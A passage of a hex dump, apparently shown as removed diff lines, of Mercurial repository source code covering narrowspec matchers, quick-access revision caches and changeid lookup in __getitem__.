-0000fa20: 7661 6c69 6461 7465 7761 726e 6564 203d  validatewarned =
-0000fa30: 2054 7275 650a 2020 2020 2020 2020 2020   True.          
-0000fa40: 2020 2020 2020 7365 6c66 2e75 692e 7761        self.ui.wa
-0000fa50: 726e 280a 2020 2020 2020 2020 2020 2020  rn(.            
-0000fa60: 2020 2020 2020 2020 5f28 6222 7761 726e          _(b"warn
-0000fa70: 696e 673a 2069 676e 6f72 696e 6720 756e  ing: ignoring un
-0000fa80: 6b6e 6f77 6e20 776f 726b 696e 6720 7061  known working pa
-0000fa90: 7265 6e74 2025 7321 5c6e 2229 0a20 2020  rent %s!\n").   
-0000faa0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0000fab0: 2025 2073 686f 7274 286e 6f64 6529 0a20   % short(node). 
-0000fac0: 2020 2020 2020 2020 2020 2020 2020 2029                 )
-0000fad0: 0a20 2020 2020 2020 2020 2020 2072 6574  .            ret
-0000fae0: 7572 6e20 7365 6c66 2e6e 756c 6c69 640a  urn self.nullid.
-0000faf0: 0a20 2020 2040 7374 6f72 6563 6163 6865  .    @storecache
-0000fb00: 286e 6172 726f 7773 7065 632e 4649 4c45  (narrowspec.FILE
-0000fb10: 4e41 4d45 290a 2020 2020 6465 6620 6e61  NAME).    def na
-0000fb20: 7272 6f77 7061 7473 2873 656c 6629 3a0a  rrowpats(self):.
-0000fb30: 2020 2020 2020 2020 2222 226d 6174 6368          """match
-0000fb40: 6572 2070 6174 7465 726e 7320 666f 7220  er patterns for 
-0000fb50: 7468 6973 2072 6570 6f73 6974 6f72 7927  this repository'
-0000fb60: 7320 6e61 7272 6f77 7370 6563 0a0a 2020  s narrowspec..  
-0000fb70: 2020 2020 2020 4120 7475 706c 6520 6f66        A tuple of
-0000fb80: 2028 696e 636c 7564 6573 2c20 6578 636c   (includes, excl
-0000fb90: 7564 6573 292e 0a20 2020 2020 2020 2022  udes)..        "
-0000fba0: 2222 0a20 2020 2020 2020 2023 2074 6865  "".        # the
-0000fbb0: 206e 6172 726f 7720 6d61 6e61 6765 6d65   narrow manageme
-0000fbc0: 6e74 2073 686f 756c 6420 7072 6f62 6162  nt should probab
-0000fbd0: 6c79 206d 6f76 6520 696e 746f 2069 7473  ly move into its
-0000fbe0: 206f 776e 206f 626a 6563 740a 2020 2020   own object.    
-0000fbf0: 2020 2020 7661 6c20 3d20 7365 6c66 2e5f      val = self._
-0000fc00: 7065 6e64 696e 675f 6e61 7272 6f77 5f70  pending_narrow_p
-0000fc10: 6174 730a 2020 2020 2020 2020 6966 2076  ats.        if v
-0000fc20: 616c 2069 7320 4e6f 6e65 3a0a 2020 2020  al is None:.    
-0000fc30: 2020 2020 2020 2020 7661 6c20 3d20 6e61          val = na
-0000fc40: 7272 6f77 7370 6563 2e6c 6f61 6428 7365  rrowspec.load(se
-0000fc50: 6c66 290a 2020 2020 2020 2020 7265 7475  lf).        retu
-0000fc60: 726e 2076 616c 0a0a 2020 2020 4073 746f  rn val..    @sto
-0000fc70: 7265 6361 6368 6528 6e61 7272 6f77 7370  recache(narrowsp
-0000fc80: 6563 2e46 494c 454e 414d 4529 0a20 2020  ec.FILENAME).   
-0000fc90: 2064 6566 205f 7374 6f72 656e 6172 726f   def _storenarro
-0000fca0: 776d 6174 6368 2873 656c 6629 3a0a 2020  wmatch(self):.  
-0000fcb0: 2020 2020 2020 6966 2072 6571 7569 7265        if require
-0000fcc0: 6d65 6e74 736d 6f64 2e4e 4152 524f 575f  mentsmod.NARROW_
-0000fcd0: 5245 5155 4952 454d 454e 5420 6e6f 7420  REQUIREMENT not 
-0000fce0: 696e 2073 656c 662e 7265 7175 6972 656d  in self.requirem
-0000fcf0: 656e 7473 3a0a 2020 2020 2020 2020 2020  ents:.          
-0000fd00: 2020 7265 7475 726e 206d 6174 6368 6d6f    return matchmo
-0000fd10: 642e 616c 7761 7973 2829 0a20 2020 2020  d.always().     
-0000fd20: 2020 2069 6e63 6c75 6465 2c20 6578 636c     include, excl
-0000fd30: 7564 6520 3d20 7365 6c66 2e6e 6172 726f  ude = self.narro
-0000fd40: 7770 6174 730a 2020 2020 2020 2020 7265  wpats.        re
-0000fd50: 7475 726e 206e 6172 726f 7773 7065 632e  turn narrowspec.
-0000fd60: 6d61 7463 6828 7365 6c66 2e72 6f6f 742c  match(self.root,
-0000fd70: 2069 6e63 6c75 6465 3d69 6e63 6c75 6465   include=include
-0000fd80: 2c20 6578 636c 7564 653d 6578 636c 7564  , exclude=exclud
-0000fd90: 6529 0a0a 2020 2020 4073 746f 7265 6361  e)..    @storeca
-0000fda0: 6368 6528 6e61 7272 6f77 7370 6563 2e46  che(narrowspec.F
-0000fdb0: 494c 454e 414d 4529 0a20 2020 2064 6566  ILENAME).    def
-0000fdc0: 205f 6e61 7272 6f77 6d61 7463 6828 7365   _narrowmatch(se
-0000fdd0: 6c66 293a 0a20 2020 2020 2020 2069 6620  lf):.        if 
-0000fde0: 7265 7175 6972 656d 656e 7473 6d6f 642e  requirementsmod.
-0000fdf0: 4e41 5252 4f57 5f52 4551 5549 5245 4d45  NARROW_REQUIREME
-0000fe00: 4e54 206e 6f74 2069 6e20 7365 6c66 2e72  NT not in self.r
-0000fe10: 6571 7569 7265 6d65 6e74 733a 0a20 2020  equirements:.   
-0000fe20: 2020 2020 2020 2020 2072 6574 7572 6e20           return 
-0000fe30: 6d61 7463 686d 6f64 2e61 6c77 6179 7328  matchmod.always(
-0000fe40: 290a 2020 2020 2020 2020 6e61 7272 6f77  ).        narrow
-0000fe50: 7370 6563 2e63 6865 636b 776f 726b 696e  spec.checkworkin
-0000fe60: 6763 6f70 796e 6172 726f 7773 7065 6328  gcopynarrowspec(
-0000fe70: 7365 6c66 290a 2020 2020 2020 2020 696e  self).        in
-0000fe80: 636c 7564 652c 2065 7863 6c75 6465 203d  clude, exclude =
-0000fe90: 2073 656c 662e 6e61 7272 6f77 7061 7473   self.narrowpats
-0000fea0: 0a20 2020 2020 2020 2072 6574 7572 6e20  .        return 
-0000feb0: 6e61 7272 6f77 7370 6563 2e6d 6174 6368  narrowspec.match
-0000fec0: 2873 656c 662e 726f 6f74 2c20 696e 636c  (self.root, incl
-0000fed0: 7564 653d 696e 636c 7564 652c 2065 7863  ude=include, exc
-0000fee0: 6c75 6465 3d65 7863 6c75 6465 290a 0a20  lude=exclude).. 
-0000fef0: 2020 2064 6566 206e 6172 726f 776d 6174     def narrowmat
-0000ff00: 6368 2873 656c 662c 206d 6174 6368 3d4e  ch(self, match=N
-0000ff10: 6f6e 652c 2069 6e63 6c75 6465 6578 6163  one, includeexac
-0000ff20: 743d 4661 6c73 6529 3a0a 2020 2020 2020  t=False):.      
-0000ff30: 2020 2222 226d 6174 6368 6572 2063 6f72    """matcher cor
-0000ff40: 7265 7370 6f6e 6469 6e67 2074 6865 2074  responding the t
-0000ff50: 6865 2072 6570 6f27 7320 6e61 7272 6f77  he repo's narrow
-0000ff60: 7370 6563 0a0a 2020 2020 2020 2020 4966  spec..        If
-0000ff70: 2060 6d61 7463 6860 2069 7320 6769 7665   `match` is give
-0000ff80: 6e2c 2074 6865 6e20 7468 6174 2077 696c  n, then that wil
-0000ff90: 6c20 6265 2069 6e74 6572 7365 6374 6564  l be intersected
-0000ffa0: 2077 6974 6820 7468 6520 6e61 7272 6f77   with the narrow
-0000ffb0: 0a20 2020 2020 2020 206d 6174 6368 6572  .        matcher
-0000ffc0: 2e0a 0a20 2020 2020 2020 2049 6620 6069  ...        If `i
-0000ffd0: 6e63 6c75 6465 6578 6163 7460 2069 7320  ncludeexact` is 
-0000ffe0: 5472 7565 2c20 7468 656e 2061 6e79 2065  True, then any e
-0000fff0: 7861 6374 206d 6174 6368 6573 2066 726f  xact matches fro
-00010000: 6d20 606d 6174 6368 6020 7769 6c6c 0a20  m `match` will. 
-00010010: 2020 2020 2020 2062 6520 696e 636c 7564         be includ
-00010020: 6564 2065 7665 6e20 6966 2074 6865 7927  ed even if they'
-00010030: 7265 206f 7574 7369 6465 2074 6865 206e  re outside the n
-00010040: 6172 726f 7773 7065 632e 0a20 2020 2020  arrowspec..     
-00010050: 2020 2022 2222 0a20 2020 2020 2020 2069     """.        i
-00010060: 6620 6d61 7463 683a 0a20 2020 2020 2020  f match:.       
-00010070: 2020 2020 2069 6620 696e 636c 7564 6565       if includee
-00010080: 7861 6374 2061 6e64 206e 6f74 2073 656c  xact and not sel
-00010090: 662e 5f6e 6172 726f 776d 6174 6368 2e61  f._narrowmatch.a
-000100a0: 6c77 6179 7328 293a 0a20 2020 2020 2020  lways():.       
-000100b0: 2020 2020 2020 2020 2023 2064 6f20 6e6f           # do no
-000100c0: 7420 6578 636c 7564 6520 6578 706c 6963  t exclude explic
-000100d0: 6974 6c79 2d73 7065 6369 6669 6564 2070  itly-specified p
-000100e0: 6174 6873 2073 6f20 7468 6174 2074 6865  aths so that the
-000100f0: 7920 6361 6e0a 2020 2020 2020 2020 2020  y can.          
-00010100: 2020 2020 2020 2320 6265 2077 6172 6e65        # be warne
-00010110: 6420 6c61 7465 7220 6f6e 0a20 2020 2020  d later on.     
-00010120: 2020 2020 2020 2020 2020 2065 6d20 3d20             em = 
-00010130: 6d61 7463 686d 6f64 2e65 7861 6374 286d  matchmod.exact(m
-00010140: 6174 6368 2e66 696c 6573 2829 290a 2020  atch.files()).  
-00010150: 2020 2020 2020 2020 2020 2020 2020 6e6d                nm
-00010160: 203d 206d 6174 6368 6d6f 642e 756e 696f   = matchmod.unio
-00010170: 6e6d 6174 6368 6572 285b 7365 6c66 2e5f  nmatcher([self._
-00010180: 6e61 7272 6f77 6d61 7463 682c 2065 6d5d  narrowmatch, em]
-00010190: 290a 2020 2020 2020 2020 2020 2020 2020  ).              
-000101a0: 2020 7265 7475 726e 206d 6174 6368 6d6f    return matchmo
-000101b0: 642e 696e 7465 7273 6563 746d 6174 6368  d.intersectmatch
-000101c0: 6572 7328 6d61 7463 682c 206e 6d29 0a20  ers(match, nm). 
-000101d0: 2020 2020 2020 2020 2020 2072 6574 7572             retur
-000101e0: 6e20 6d61 7463 686d 6f64 2e69 6e74 6572  n matchmod.inter
-000101f0: 7365 6374 6d61 7463 6865 7273 286d 6174  sectmatchers(mat
-00010200: 6368 2c20 7365 6c66 2e5f 6e61 7272 6f77  ch, self._narrow
-00010210: 6d61 7463 6829 0a20 2020 2020 2020 2072  match).        r
-00010220: 6574 7572 6e20 7365 6c66 2e5f 6e61 7272  eturn self._narr
-00010230: 6f77 6d61 7463 680a 0a20 2020 2064 6566  owmatch..    def
-00010240: 2073 6574 6e61 7272 6f77 7061 7473 2873   setnarrowpats(s
-00010250: 656c 662c 206e 6577 696e 636c 7564 6573  elf, newincludes
-00010260: 2c20 6e65 7765 7863 6c75 6465 7329 3a0a  , newexcludes):.
-00010270: 2020 2020 2020 2020 6e61 7272 6f77 7370          narrowsp
-00010280: 6563 2e73 6176 6528 7365 6c66 2c20 6e65  ec.save(self, ne
-00010290: 7769 6e63 6c75 6465 732c 206e 6577 6578  wincludes, newex
-000102a0: 636c 7564 6573 290a 2020 2020 2020 2020  cludes).        
-000102b0: 7365 6c66 2e69 6e76 616c 6964 6174 6528  self.invalidate(
-000102c0: 636c 6561 7266 696c 6563 6163 6865 3d54  clearfilecache=T
-000102d0: 7275 6529 0a0a 2020 2020 4075 6e66 696c  rue)..    @unfil
-000102e0: 7465 7265 6470 726f 7065 7274 7963 6163  teredpropertycac
-000102f0: 6865 0a20 2020 2064 6566 205f 7175 6963  he.    def _quic
-00010300: 6b5f 6163 6365 7373 5f63 6861 6e67 6569  k_access_changei
-00010310: 645f 6e75 6c6c 2873 656c 6629 3a0a 2020  d_null(self):.  
-00010320: 2020 2020 2020 7265 7475 726e 207b 0a20        return {. 
-00010330: 2020 2020 2020 2020 2020 2062 276e 756c             b'nul
-00010340: 6c27 3a20 286e 756c 6c72 6576 2c20 7365  l': (nullrev, se
-00010350: 6c66 2e6e 6f64 6563 6f6e 7374 616e 7473  lf.nodeconstants
-00010360: 2e6e 756c 6c69 6429 2c0a 2020 2020 2020  .nullid),.      
-00010370: 2020 2020 2020 6e75 6c6c 7265 763a 2028        nullrev: (
-00010380: 6e75 6c6c 7265 762c 2073 656c 662e 6e6f  nullrev, self.no
-00010390: 6465 636f 6e73 7461 6e74 732e 6e75 6c6c  deconstants.null
-000103a0: 6964 292c 0a20 2020 2020 2020 2020 2020  id),.           
-000103b0: 2073 656c 662e 6e75 6c6c 6964 3a20 286e   self.nullid: (n
-000103c0: 756c 6c72 6576 2c20 7365 6c66 2e6e 756c  ullrev, self.nul
-000103d0: 6c69 6429 2c0a 2020 2020 2020 2020 7d0a  lid),.        }.
-000103e0: 0a20 2020 2040 756e 6669 6c74 6572 6564  .    @unfiltered
-000103f0: 7072 6f70 6572 7479 6361 6368 650a 2020  propertycache.  
-00010400: 2020 6465 6620 5f71 7569 636b 5f61 6363    def _quick_acc
-00010410: 6573 735f 6368 616e 6765 6964 5f77 6328  ess_changeid_wc(
-00010420: 7365 6c66 293a 0a20 2020 2020 2020 2023  self):.        #
-00010430: 2061 6c73 6f20 6661 7374 2070 6174 6820   also fast path 
-00010440: 6163 6365 7373 2074 6f20 7468 6520 776f  access to the wo
-00010450: 726b 696e 6720 636f 7079 2070 6172 656e  rking copy paren
-00010460: 7473 0a20 2020 2020 2020 2023 2068 6f77  ts.        # how
-00010470: 6576 6572 2c20 6f6e 6c79 2064 6f20 6974  ever, only do it
-00010480: 2066 6f72 2066 696c 7465 7220 7468 6174   for filter that
-00010490: 2065 6e73 7572 6520 7763 2069 7320 7669   ensure wc is vi
-000104a0: 7369 626c 652e 0a20 2020 2020 2020 2071  sible..        q
-000104b0: 7569 636b 203d 2073 656c 662e 5f71 7569  uick = self._qui
-000104c0: 636b 5f61 6363 6573 735f 6368 616e 6765  ck_access_change
-000104d0: 6964 5f6e 756c 6c2e 636f 7079 2829 0a20  id_null.copy(). 
-000104e0: 2020 2020 2020 2063 6c20 3d20 7365 6c66         cl = self
-000104f0: 2e75 6e66 696c 7465 7265 6428 292e 6368  .unfiltered().ch
-00010500: 616e 6765 6c6f 670a 2020 2020 2020 2020  angelog.        
-00010510: 666f 7220 6e6f 6465 2069 6e20 7365 6c66  for node in self
-00010520: 2e64 6972 7374 6174 652e 7061 7265 6e74  .dirstate.parent
-00010530: 7328 293a 0a20 2020 2020 2020 2020 2020  s():.           
-00010540: 2069 6620 6e6f 6465 203d 3d20 7365 6c66   if node == self
-00010550: 2e6e 756c 6c69 643a 0a20 2020 2020 2020  .nullid:.       
-00010560: 2020 2020 2020 2020 2063 6f6e 7469 6e75           continu
-00010570: 650a 2020 2020 2020 2020 2020 2020 7265  e.            re
-00010580: 7620 3d20 636c 2e69 6e64 6578 2e67 6574  v = cl.index.get
-00010590: 5f72 6576 286e 6f64 6529 0a20 2020 2020  _rev(node).     
-000105a0: 2020 2020 2020 2069 6620 7265 7620 6973         if rev is
-000105b0: 204e 6f6e 653a 0a20 2020 2020 2020 2020   None:.         
-000105c0: 2020 2020 2020 2023 2075 6e6b 6e6f 776e         # unknown
-000105d0: 2077 6f72 6b69 6e67 2063 6f70 7920 7061   working copy pa
-000105e0: 7265 6e74 2063 6173 653a 0a20 2020 2020  rent case:.     
-000105f0: 2020 2020 2020 2020 2020 2023 0a20 2020             #.   
-00010600: 2020 2020 2020 2020 2020 2020 2023 2020               #  
-00010610: 2073 6b69 7020 7468 6520 6661 7374 2070   skip the fast p
-00010620: 6174 6820 616e 6420 6c65 7420 6869 6768  ath and let high
-00010630: 6572 2063 6f64 6520 6465 616c 2077 6974  er code deal wit
-00010640: 6820 6974 0a20 2020 2020 2020 2020 2020  h it.           
-00010650: 2020 2020 2063 6f6e 7469 6e75 650a 2020       continue.  
-00010660: 2020 2020 2020 2020 2020 7061 6972 203d            pair =
-00010670: 2028 7265 762c 206e 6f64 6529 0a20 2020   (rev, node).   
-00010680: 2020 2020 2020 2020 2071 7569 636b 5b72           quick[r
-00010690: 6576 5d20 3d20 7061 6972 0a20 2020 2020  ev] = pair.     
-000106a0: 2020 2020 2020 2071 7569 636b 5b6e 6f64         quick[nod
-000106b0: 655d 203d 2070 6169 720a 2020 2020 2020  e] = pair.      
-000106c0: 2020 2020 2020 2320 616c 736f 2061 6464        # also add
-000106d0: 2074 6865 2070 6172 656e 7473 206f 6620   the parents of 
-000106e0: 7468 6520 7061 7265 6e74 730a 2020 2020  the parents.    
-000106f0: 2020 2020 2020 2020 666f 7220 7220 696e          for r in
-00010700: 2063 6c2e 7061 7265 6e74 7265 7673 2872   cl.parentrevs(r
-00010710: 6576 293a 0a20 2020 2020 2020 2020 2020  ev):.           
-00010720: 2020 2020 2069 6620 7220 3d3d 206e 756c       if r == nul
-00010730: 6c72 6576 3a0a 2020 2020 2020 2020 2020  lrev:.          
-00010740: 2020 2020 2020 2020 2020 636f 6e74 696e            contin
-00010750: 7565 0a20 2020 2020 2020 2020 2020 2020  ue.             
-00010760: 2020 206e 203d 2063 6c2e 6e6f 6465 2872     n = cl.node(r
-00010770: 290a 2020 2020 2020 2020 2020 2020 2020  ).              
-00010780: 2020 7061 6972 203d 2028 722c 206e 290a    pair = (r, n).
-00010790: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000107a0: 7175 6963 6b5b 725d 203d 2070 6169 720a  quick[r] = pair.
-000107b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000107c0: 7175 6963 6b5b 6e5d 203d 2070 6169 720a  quick[n] = pair.
-000107d0: 2020 2020 2020 2020 7031 6e6f 6465 203d          p1node =
-000107e0: 2073 656c 662e 6469 7273 7461 7465 2e70   self.dirstate.p
-000107f0: 3128 290a 2020 2020 2020 2020 6966 2070  1().        if p
-00010800: 316e 6f64 6520 213d 2073 656c 662e 6e75  1node != self.nu
-00010810: 6c6c 6964 3a0a 2020 2020 2020 2020 2020  llid:.          
-00010820: 2020 7175 6963 6b5b 6227 2e27 5d20 3d20    quick[b'.'] = 
-00010830: 7175 6963 6b5b 7031 6e6f 6465 5d0a 2020  quick[p1node].  
-00010840: 2020 2020 2020 7265 7475 726e 2071 7569        return qui
-00010850: 636b 0a0a 2020 2020 4075 6e66 696c 7465  ck..    @unfilte
-00010860: 7265 646d 6574 686f 640a 2020 2020 6465  redmethod.    de
-00010870: 6620 5f71 7569 636b 5f61 6363 6573 735f  f _quick_access_
-00010880: 6368 616e 6765 6964 5f69 6e76 616c 6964  changeid_invalid
-00010890: 6174 6528 7365 6c66 293a 0a20 2020 2020  ate(self):.     
-000108a0: 2020 2069 6620 275f 7175 6963 6b5f 6163     if '_quick_ac
-000108b0: 6365 7373 5f63 6861 6e67 6569 645f 7763  cess_changeid_wc
-000108c0: 2720 696e 2076 6172 7328 7365 6c66 293a  ' in vars(self):
-000108d0: 0a20 2020 2020 2020 2020 2020 2064 656c  .            del
-000108e0: 2073 656c 662e 5f5f 6469 6374 5f5f 5b27   self.__dict__['
-000108f0: 5f71 7569 636b 5f61 6363 6573 735f 6368  _quick_access_ch
-00010900: 616e 6765 6964 5f77 6327 5d0a 0a20 2020  angeid_wc']..   
-00010910: 2040 7072 6f70 6572 7479 0a20 2020 2064   @property.    d
-00010920: 6566 205f 7175 6963 6b5f 6163 6365 7373  ef _quick_access
-00010930: 5f63 6861 6e67 6569 6428 7365 6c66 293a  _changeid(self):
-00010940: 0a20 2020 2020 2020 2022 2222 616e 2068  .        """an h
-00010950: 656c 7065 7220 6469 6374 696f 6e6e 6172  elper dictionnar
-00010960: 7920 666f 7220 5f5f 6765 7469 7465 6d5f  y for __getitem_
-00010970: 5f20 6361 6c6c 730a 0a20 2020 2020 2020  _ calls..       
-00010980: 2054 6869 7320 636f 6e74 6169 6e73 2061   This contains a
-00010990: 206c 6973 7420 6f66 2073 796d 626f 6c20   list of symbol 
-000109a0: 7765 2063 616e 2072 6563 6f67 6e69 7365  we can recognise
-000109b0: 2072 6967 6874 2061 7761 7920 7769 7468   right away with
-000109c0: 6f75 740a 2020 2020 2020 2020 6675 7274  out.        furt
-000109d0: 6865 7220 7072 6f63 6573 7369 6e67 2e0a  her processing..
-000109e0: 2020 2020 2020 2020 2222 220a 2020 2020          """.    
-000109f0: 2020 2020 6966 2073 656c 662e 6669 6c74      if self.filt
-00010a00: 6572 6e61 6d65 2069 6e20 7265 706f 7669  ername in repovi
-00010a10: 6577 2e66 696c 7465 725f 6861 735f 7763  ew.filter_has_wc
-00010a20: 3a0a 2020 2020 2020 2020 2020 2020 7265  :.            re
-00010a30: 7475 726e 2073 656c 662e 5f71 7569 636b  turn self._quick
-00010a40: 5f61 6363 6573 735f 6368 616e 6765 6964  _access_changeid
-00010a50: 5f77 630a 2020 2020 2020 2020 7265 7475  _wc.        retu
-00010a60: 726e 2073 656c 662e 5f71 7569 636b 5f61  rn self._quick_a
-00010a70: 6363 6573 735f 6368 616e 6765 6964 5f6e  ccess_changeid_n
-00010a80: 756c 6c0a 0a20 2020 2064 6566 205f 5f67  ull..    def __g
-00010a90: 6574 6974 656d 5f5f 2873 656c 662c 2063  etitem__(self, c
-00010aa0: 6861 6e67 6569 6429 3a0a 2020 2020 2020  hangeid):.      
-00010ab0: 2020 2320 6465 616c 696e 6720 7769 7468    # dealing with
-00010ac0: 2073 7065 6369 616c 2063 6173 6573 0a20   special cases. 
-00010ad0: 2020 2020 2020 2069 6620 6368 616e 6765         if change
-00010ae0: 6964 2069 7320 4e6f 6e65 3a0a 2020 2020  id is None:.    
-00010af0: 2020 2020 2020 2020 7265 7475 726e 2063          return c
-00010b00: 6f6e 7465 7874 2e77 6f72 6b69 6e67 6374  ontext.workingct
-00010b10: 7828 7365 6c66 290a 2020 2020 2020 2020  x(self).        
-00010b20: 6966 2069 7369 6e73 7461 6e63 6528 6368  if isinstance(ch
-00010b30: 616e 6765 6964 2c20 636f 6e74 6578 742e  angeid, context.
-00010b40: 6261 7365 6374 7829 3a0a 2020 2020 2020  basectx):.      
-00010b50: 2020 2020 2020 7265 7475 726e 2063 6861        return cha
-00010b60: 6e67 6569 640a 0a20 2020 2020 2020 2023  ngeid..        #
-00010b70: 2064 6561 6c69 6e67 2077 6974 6820 6d75   dealing with mu
-00010b80: 6c74 6970 6c65 2072 6576 6973 696f 6e73  ltiple revisions
-00010b90: 0a20 2020 2020 2020 2069 6620 6973 696e  .        if isin
-00010ba0: 7374 616e 6365 2863 6861 6e67 6569 642c  stance(changeid,
-00010bb0: 2073 6c69 6365 293a 0a20 2020 2020 2020   slice):.       
-00010bc0: 2020 2020 2023 2077 6469 7272 6576 2069       # wdirrev i
-00010bd0: 736e 2774 2063 6f6e 7469 6775 6f75 7320  sn't contiguous 
-00010be0: 736f 2074 6865 2073 6c69 6365 2073 686f  so the slice sho
-00010bf0: 756c 646e 2774 2069 6e63 6c75 6465 2069  uldn't include i
-00010c00: 740a 2020 2020 2020 2020 2020 2020 7265  t.            re
-00010c10: 7475 726e 205b 0a20 2020 2020 2020 2020  turn [.         
-00010c20: 2020 2020 2020 2073 656c 665b 695d 0a20         self[i]. 
-00010c30: 2020 2020 2020 2020 2020 2020 2020 2066                 f
-00010c40: 6f72 2069 2069 6e20 7261 6e67 6528 2a63  or i in range(*c
-00010c50: 6861 6e67 6569 642e 696e 6469 6365 7328  hangeid.indices(
-00010c60: 6c65 6e28 7365 6c66 2929 290a 2020 2020  len(self))).    
-00010c70: 2020 2020 2020 2020 2020 2020 6966 2069              if i
-00010c80: 206e 6f74 2069 6e20 7365 6c66 2e63 6861   not in self.cha
-00010c90: 6e67 656c 6f67 2e66 696c 7465 7265 6472  ngelog.filteredr
-00010ca0: 6576 730a 2020 2020 2020 2020 2020 2020  evs.            
-00010cb0: 5d0a 0a20 2020 2020 2020 2023 2064 6561  ]..        # dea
-00010cc0: 6c69 6e67 2077 6974 6820 736f 6d65 2073  ling with some s
-00010cd0: 7065 6369 616c 2076 616c 7565 730a 2020  pecial values.  
-00010ce0: 2020 2020 2020 7175 6963 6b5f 6163 6365        quick_acce
-00010cf0: 7373 203d 2073 656c 662e 5f71 7569 636b  ss = self._quick
-00010d00: 5f61 6363 6573 735f 6368 616e 6765 6964  _access_changeid
-00010d10: 2e67 6574 2863 6861 6e67 6569 6429 0a20  .get(changeid). 
-00010d20: 2020 2020 2020 2069 6620 7175 6963 6b5f         if quick_
-00010d30: 6163 6365 7373 2069 7320 6e6f 7420 4e6f  access is not No
-00010d40: 6e65 3a0a 2020 2020 2020 2020 2020 2020  ne:.            
-00010d50: 7265 762c 206e 6f64 6520 3d20 7175 6963  rev, node = quic
-00010d60: 6b5f 6163 6365 7373 0a20 2020 2020 2020  k_access.       
-00010d70: 2020 2020 2072 6574 7572 6e20 636f 6e74       return cont
-00010d80: 6578 742e 6368 616e 6765 6374 7828 7365  ext.changectx(se
-00010d90: 6c66 2c20 7265 762c 206e 6f64 652c 206d  lf, rev, node, m
-00010da0: 6179 6265 5f66 696c 7465 7265 643d 4661  aybe_filtered=Fa
-00010db0: 6c73 6529 0a20 2020 2020 2020 2069 6620  lse).        if 
-00010dc0: 6368 616e 6765 6964 203d 3d20 6227 7469  changeid == b'ti
-00010dd0: 7027 3a0a 2020 2020 2020 2020 2020 2020  p':.            
-00010de0: 6e6f 6465 203d 2073 656c 662e 6368 616e  node = self.chan
-00010df0: 6765 6c6f 672e 7469 7028 290a 2020 2020  gelog.tip().    
-00010e00: 2020 2020 2020 2020 7265 7620 3d20 7365          rev = se
-00010e10: 6c66 2e63 6861 6e67 656c 6f67 2e72 6576  lf.changelog.rev
-00010e20: 286e 6f64 6529 0a20 2020 2020 2020 2020  (node).         
-00010e30: 2020 2072 6574 7572 6e20 636f 6e74 6578     return contex
-00010e40: 742e 6368 616e 6765 6374 7828 7365 6c66  t.changectx(self
-00010e50: 2c20 7265 762c 206e 6f64 6529 0a0a 2020  , rev, node)..  
-00010e60: 2020 2020 2020 2320 6465 616c 696e 6720        # dealing 
-00010e70: 7769 7468 2061 7262 6974 7261 7279 2076  with arbitrary v
-00010e80: 616c 7565 730a 2020 2020 2020 2020 7472  alues.        tr
-00010e90: 793a 0a20 2020 2020 2020 2020 2020 2069  y:.            i
-00010ea0: 6620 6973 696e 7374 616e 6365 2863 6861  f isinstance(cha
-00010eb0: 6e67 6569 642c 2069 6e74 293a 0a20 2020  ngeid, int):.   
-00010ec0: 2020 2020 2020 2020 2020 2020 206e 6f64               nod
-00010ed0: 6520 3d20 7365 6c66 2e63 6861 6e67 656c  e = self.changel
-00010ee0: 6f67 2e6e 6f64 6528 6368 616e 6765 6964  og.node(changeid
-00010ef0: 290a 2020 2020 2020 2020 2020 2020 2020  ).              
-00010f00: 2020 7265 7620 3d20 6368 616e 6765 6964    rev = changeid
-00010f10: 0a20 2020 2020 2020 2020 2020 2065 6c69  .            eli
-00010f20: 6620 6368 616e 6765 6964 203d 3d20 6227  f changeid == b'
-00010f30: 2e27 3a0a 2020 2020 2020 2020 2020 2020  .':.            
-00010f40: 2020 2020 2320 7468 6973 2069 7320 6120      # this is a 
-00010f50: 6861 636b 2074 6f20 6465 6c61 792f 6176  hack to delay/av
-00010f60: 6f69 6420 6c6f 6164 696e 6720 6f62 736d  oid loading obsm
-00010f70: 6172 6b65 7273 0a20 2020 2020 2020 2020  arkers.         
-00010f80: 2020 2020 2020 2023 2077 6865 6e20 7765         # when we
-00010f90: 206b 6e6f 7720 7468 6174 2027 2e27 2077   know that '.' w
-00010fa0: 6f6e 2774 2062 6520 6869 6464 656e 0a20  on't be hidden. 
-00010fb0: 2020 2020 2020 2020 2020 2020 2020 206e                 n
-00010fc0: 6f64 6520 3d20 7365 6c66 2e64 6972 7374  ode = self.dirst
-00010fd0: 6174 652e 7031 2829 0a20 2020 2020 2020  ate.p1().       
-00010fe0: 2020 2020 2020 2020 2072 6576 203d 2073           rev = s
-00010ff0: 656c 662e 756e 6669 6c74 6572 6564 2829  elf.unfiltered()
-00011000: 2e63 6861 6e67 656c 6f67 2e72 6576 286e  .changelog.rev(n
-00011010: 6f64 6529 0a20 2020 2020 2020 2020 2020  ode).           
-00011020: 2065 6c69 6620 6c65 6e28 6368 616e 6765   elif len(change
-00011030: 6964 2920 3d3d 2073 656c 662e 6e6f 6465  id) == self.node
-00011040: 636f 6e73 7461 6e74 732e 6e6f 6465 6c65  constants.nodele
-00011050: 6e3a 0a20 2020 2020 2020 2020 2020 2020  n:.             
-00011060: 2020 2074 7279 3a0a 2020 2020 2020 2020     try:.        
-00011070: 2020 2020 2020 2020 2020 2020 6e6f 6465              node
-00011080: 203d 2063 6861 6e67 6569 640a 2020 2020   = changeid.    
-00011090: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000110a0: 7265 7620 3d20 7365 6c66 2e63 6861 6e67  rev = self.chang
-000110b0: 656c 6f67 2e72 6576 2863 6861 6e67 6569  elog.rev(changei
-000110c0: 6429 0a20 2020 2020 2020 2020 2020 2020  d).             
-000110d0: 2020 2065 7863 6570 7420 6572 726f 722e     except error.
-000110e0: 4669 6c74 6572 6564 4c6f 6f6b 7570 4572  FilteredLookupEr
-000110f0: 726f 723a 0a20 2020 2020 2020 2020 2020  ror:.           
-00011100: 2020 2020 2020 2020 2063 6861 6e67 6569           changei
-00011110: 6420 3d20 6865 7828 6368 616e 6765 6964  d = hex(changeid
-00011120: 2920 2023 2066 6f72 2074 6865 2065 7272  )  # for the err
-00011130: 6f72 206d 6573 7361 6765 0a20 2020 2020  or message.     
-00011140: 2020 2020 2020 2020 2020 2020 2020 2072                 r
-00011150: 6169 7365 0a20 2020 2020 2020 2020 2020  aise.           
-00011160: 2020 2020 2065 7863 6570 7420 4c6f 6f6b       except Look
-00011170: 7570 4572 726f 723a 0a20 2020 2020 2020  upError:.       
